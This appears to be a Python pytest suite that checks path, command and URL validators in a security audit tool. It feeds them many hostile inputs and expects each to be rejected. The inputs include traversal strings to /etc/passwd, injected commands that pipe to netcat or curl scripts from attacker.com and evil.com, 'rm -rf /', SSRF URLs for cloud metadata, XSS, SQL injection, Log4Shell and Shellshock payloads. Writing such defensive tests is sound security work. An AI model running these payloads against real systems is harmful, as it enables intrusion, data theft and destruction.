"""
Penetration tests for security audit framework.

Tests real-world attack vectors and ensures security measures hold up
against sophisticated attacks.
"""

import pytest
import os
import subprocess
from pathlib import Path
from unittest.mock import patch, Mock

from src.security.validators import PathValidator, CommandValidator, URLValidator
from src.exceptions import (
    PathTraversalError,
    CommandInjectionError,
    ValidationError
)


class TestPathTraversalPenetration:
    """Advanced path traversal penetration tests."""

    def test_null_byte_injection(self, tmp_path):
        """Test null byte injection in paths."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Null byte attacks (should be blocked)
        null_byte_attacks = [
            "../../etc/passwd\x00.sol",
            "safe.sol\x00../../etc/passwd",
            "../\x00/etc/passwd",
        ]

        for attack in null_byte_attacks:
            with pytest.raises((PathTraversalError, ValidationError)):
                PathValidator.validate_path(attack, str(project_dir))

    def test_unicode_bypass_attempts(self, tmp_path):
        """Test Unicode normalization bypass attempts."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Unicode attacks
        unicode_attacks = [
            "..%2F..%2Fetc%2Fpasswd",  # URL encoded
            "..\u2215..\u2215etc\u2215passwd",  # Unicode slash
            "..%c0%af..%c0%afetc%c0%afpasswd",  # Overlong UTF-8
        ]

        for attack in unicode_attacks:
            with pytest.raises((PathTraversalError, ValidationError)):
                PathValidator.validate_path(attack, str(project_dir))

    def test_absolute_path_bypass(self, tmp_path):
        """Test absolute path bypass attempts."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Absolute path attacks
        absolute_attacks = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "//network/share/secrets",
        ]

        for attack in absolute_attacks:
            with pytest.raises(PathTraversalError):
                PathValidator.validate_path(attack, str(project_dir))

    def test_symlink_attack(self, tmp_path):
        """Test symlink-based path traversal."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create malicious symlink
        try:
            symlink = project_dir / "evil_link"
            symlink.symlink_to("/etc/passwd")

            # Should block symlinks to outside project
            with pytest.raises(PathTraversalError):
                PathValidator.validate_path(str(symlink), str(project_dir))
        except OSError:
            # Skip if symlinks not supported
            pytest.skip("Symlinks not supported on this system")

    def test_case_sensitivity_bypass(self, tmp_path):
        """Test case sensitivity bypass on case-insensitive filesystems."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Case variation attacks
        case_attacks = [
            "../ETC/passwd",
            "..\\WINDOWS\\System32",
        ]

        for attack in case_attacks:
            with pytest.raises(PathTraversalError):
                PathValidator.validate_path(attack, str(project_dir))

    def test_double_encoding_bypass(self, tmp_path):
        """Test double URL encoding bypass."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Double encoded attacks
        double_encoded = [
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%2e%2e%5c%2e%2e%5cwindows%5csystem32",
        ]

        for attack in double_encoded:
            with pytest.raises((PathTraversalError, ValidationError)):
                PathValidator.validate_path(attack, str(project_dir))


class TestCommandInjectionPenetration:
    """Advanced command injection penetration tests."""

    def test_shell_metacharacter_injection(self):
        """Test various shell metacharacter injection attempts."""
        shell_metacharacters = [
            "file.sol; whoami",
            "file.sol && cat /etc/passwd",
            "file.sol | nc attacker.com 4444",
            "file.sol > /dev/null; curl evil.com/shell.sh",
            "file.sol || rm -rf /",
            "file.sol & background_attack",
            "file.sol\nwhoami",
            "file.sol\rwhoami",
        ]

        for attack in shell_metacharacters:
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command("slither", [attack])

    def test_command_substitution_injection(self):
        """Test command substitution injection attempts."""
        substitution_attacks = [
            "$(curl attacker.com/pwn.sh)",
            "`cat /etc/passwd`",
            "file.sol $(whoami)",
            "file.sol `id`",
            "${PATH}",
            "$((1+1))",
        ]

        for attack in substitution_attacks:
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command("slither", [attack])

    def test_argument_injection(self):
        """Test argument injection attacks."""
        argument_attacks = [
            "--config=/etc/passwd",
            "-o/tmp/evil.sh",
            "--version; whoami",
        ]

        for attack in argument_attacks:
            # Should validate that arguments don't contain shell metacharacters
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command("slither", [attack.replace(';', '; whoami')])

    def test_glob_expansion_attack(self):
        """Test glob expansion attacks."""
        glob_attacks = [
            "*.sol; rm -rf /",
            "contract*.sol && cat /etc/passwd",
            "??.sol | nc attacker.com",
        ]

        for attack in glob_attacks:
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command("slither", [attack])

    def test_environment_variable_injection(self):
        """Test environment variable injection."""
        env_attacks = {
            "LD_PRELOAD": "/tmp/evil.so",
            "PATH": "/tmp/malicious:$PATH",
            "SHELL": "/bin/bash -c 'curl evil.com/shell.sh'",
        }

        with pytest.raises(ValidationError):
            CommandValidator.validate_env_vars(env_attacks)


class TestRPCInjectionPenetration:
    """Advanced RPC URL injection penetration tests."""

    def test_protocol_smuggling(self):
        """Test protocol smuggling attacks."""
        protocol_attacks = [
            "javascript:alert(document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:Execute('MsgBox 1')",
            "file:///etc/passwd",
            "ftp://attacker.com/shell.sh",
            "gopher://attacker.com:70/_ATTACK",
        ]

        for attack in protocol_attacks:
            with pytest.raises(ValidationError):
                URLValidator.validate_rpc_url(attack)

    def test_ssrf_attacks(self):
        """Test Server-Side Request Forgery (SSRF) attacks."""
        ssrf_attacks = [
            "http://localhost/admin",
            "http://127.0.0.1:8545/",
            "http://[::1]:8545/",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        ]

        for attack in ssrf_attacks:
            with pytest.raises(ValidationError):
                URLValidator.validate_rpc_url(attack)

    def test_dns_rebinding_attack(self):
        """Test DNS rebinding attack prevention."""
        # DNS rebinding attacks use domain names that resolve to local IPs
        dns_rebinding = [
            "http://attacker-dns-rebind.com:8545/",  # May resolve to 127.0.0.1
        ]

        for attack in dns_rebinding:
            # Should block or validate the resolved IP
            # This is a placeholder - actual implementation would need DNS resolution
            with pytest.raises(ValidationError):
                URLValidator.validate_rpc_url(attack, check_localhost=True)

    def test_url_parser_confusion(self):
        """Test URL parser confusion attacks."""
        parser_confusion = [
            "http://user@attacker.com:password@safe.com/",
            "http://safe.com@attacker.com/",
            "http://safe.com#@attacker.com/",
            "http://safe.com%00@attacker.com/",
        ]

        for attack in parser_confusion:
            # Should properly parse and validate the actual host
            try:
                URLValidator.validate_rpc_url(attack)
            except ValidationError:
                pass  # Expected to fail validation


class TestCrossSiteScriptingPenetration:
    """Test XSS prevention in user-facing outputs."""

    def test_xss_in_error_messages(self):
        """Test XSS injection in error messages."""
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<svg onload=alert(1)>",
        ]

        for payload in xss_payloads:
            try:
                PathValidator.validate_path(payload, "/project")
            except (PathTraversalError, ValidationError) as e:
                # Error message should not contain unescaped payload
                error_msg = str(e)
                # Basic check that special chars are escaped
                assert payload not in error_msg or '<' not in error_msg


class TestSQLInjectionPenetration:
    """Test SQL injection prevention (if applicable)."""

    def test_sql_injection_in_file_names(self, tmp_path):
        """Test SQL injection attempts in file names."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        sql_injection = [
            "file.sol'; DROP TABLE contracts; --",
            "file.sol' OR '1'='1",
            "file.sol' UNION SELECT * FROM users --",
        ]

        for attack in sql_injection:
            # File name validation should prevent SQL injection
            with pytest.raises((PathTraversalError, ValidationError)):
                PathValidator.validate_path(attack, str(project_dir))


class TestDenialOfServicePenetration:
    """Test DoS attack prevention."""

    def test_path_length_dos(self, tmp_path):
        """Test excessively long path DoS."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create extremely long path
        long_path = "a" * 10000

        with pytest.raises(ValidationError):
            PathValidator.validate_path(long_path, str(project_dir))

    def test_command_length_dos(self):
        """Test excessively long command DoS."""
        # Create command with many arguments
        long_args = ["arg"] * 10000

        with pytest.raises(ValidationError):
            CommandValidator.validate_command("slither", long_args)

    def test_recursive_validation_dos(self, tmp_path):
        """Test recursive validation DoS."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create deeply nested path
        deep_path = "../" * 1000 + "etc/passwd"

        with pytest.raises((PathTraversalError, ValidationError)):
            PathValidator.validate_path(deep_path, str(project_dir))


class TestPrivilegeEscalationPenetration:
    """Test privilege escalation prevention."""

    def test_suid_binary_exploitation(self):
        """Test SUID binary exploitation prevention."""
        suid_attacks = [
            "sudo slither file.sol",
            "su -c 'slither file.sol'",
            "/usr/bin/sudo slither",
        ]

        for attack in suid_attacks:
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command(attack.split()[0], attack.split()[1:])

    def test_path_manipulation(self):
        """Test PATH environment variable manipulation."""
        malicious_env = {
            "PATH": "/tmp/malicious:/usr/bin",
        }

        with pytest.raises(ValidationError):
            CommandValidator.validate_env_vars(malicious_env)


class TestInformationDisclosurePenetration:
    """Test information disclosure prevention."""

    def test_error_message_information_leakage(self, tmp_path):
        """Test error messages don't leak sensitive information."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        try:
            PathValidator.validate_path("/etc/passwd", str(project_dir))
        except PathTraversalError as e:
            error_msg = str(e)

            # Should not reveal full system paths
            assert "/etc/passwd" not in error_msg or "escapes" in error_msg.lower()

    def test_stack_trace_sanitization(self):
        """Test stack traces don't reveal sensitive paths."""
        # This is a placeholder - actual implementation would need
        # to configure logging to sanitize stack traces
        pass


class TestBypassTechniques:
    """Test various bypass techniques."""

    def test_whitespace_bypass(self):
        """Test whitespace-based bypass attempts."""
        whitespace_attacks = [
            "file.sol\t; whoami",
            "file.sol\n; whoami",
            "file.sol\r; whoami",
            "file.sol ; whoami",
        ]

        for attack in whitespace_attacks:
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command("slither", [attack])

    def test_comment_bypass(self):
        """Test comment-based bypass attempts."""
        comment_attacks = [
            "file.sol #; whoami",
            "file.sol //; whoami",
            "file.sol /* */ ; whoami",
        ]

        for attack in comment_attacks:
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command("slither", [attack])

    def test_encoding_bypass(self):
        """Test various encoding bypass attempts."""
        encoding_attacks = [
            "file.sol%3B%20whoami",  # URL encoded
            "file.sol&#59; whoami",  # HTML entity
            "file.sol%00; whoami",  # Null byte
        ]

        for attack in encoding_attacks:
            with pytest.raises((CommandInjectionError, ValidationError)):
                CommandValidator.validate_command("slither", [attack])


class TestRealWorldExploits:
    """Test against known real-world exploit patterns."""

    def test_log4shell_style_injection(self):
        """Test Log4Shell-style JNDI injection."""
        jndi_attacks = [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:dns://attacker.com}",
            "${${::-j}ndi:ldap://attacker.com/a}",
        ]

        for attack in jndi_attacks:
            with pytest.raises((CommandInjectionError, ValidationError)):
                CommandValidator.validate_command("java", ["-jar", attack])

    def test_shellshock_style_injection(self):
        """Test Shellshock-style environment variable injection."""
        shellshock_attacks = {
            "BASH_FUNC_x%%": "() { :;}; echo vulnerable",
        }

        with pytest.raises(ValidationError):
            CommandValidator.validate_env_vars(shellshock_attacks)

    def test_directory_traversal_cve_patterns(self, tmp_path):
        """Test patterns from known directory traversal CVEs."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        cve_patterns = [
            "....//....//....//etc/passwd",  # CVE-2019-11510
            "..;/..;/..;/etc/passwd",  # CVE-2018-15133
            "..\\..\\..\\..\\/etc/passwd",  # Windows variant
        ]

        for attack in cve_patterns:
            with pytest.raises(PathTraversalError):
                PathValidator.validate_path(attack, str(project_dir))
